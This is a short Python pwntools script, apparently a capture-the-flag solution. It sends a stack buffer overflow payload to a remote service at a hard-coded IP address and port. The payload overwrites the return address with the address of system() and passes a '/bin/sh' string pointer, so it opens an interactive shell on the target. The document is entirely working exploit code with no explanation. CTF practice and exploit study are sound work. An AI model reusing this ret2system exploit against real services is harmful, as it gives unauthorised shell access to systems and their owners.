from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",55432)
sysaddr=0x8048320
binsh=0x0804A024

payload="a"*(0x88+0x4)+p32(sysaddr)+p32(0xdeadbeef)+p32(binsh)
io.sendline(payload)

io.interactive()
